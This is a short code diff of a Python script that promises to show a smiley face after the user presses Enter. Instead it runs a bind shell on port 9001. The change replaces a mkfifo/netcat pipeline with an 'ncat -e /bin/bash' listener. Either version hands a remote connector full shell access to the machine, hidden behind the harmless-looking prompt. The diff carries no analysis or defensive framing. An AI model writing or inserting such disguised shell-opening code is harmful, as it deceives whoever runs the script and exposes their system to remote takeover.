@@ -8,6 +8,6 @@ print("Hit enter to see a smiley face")
 
 input()
 
-command = "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 9001 > /tmp/f"
+command = "ncat -lnp 9001 -e /bin/bash"  
 
 subprocess.call(command, shell=True)
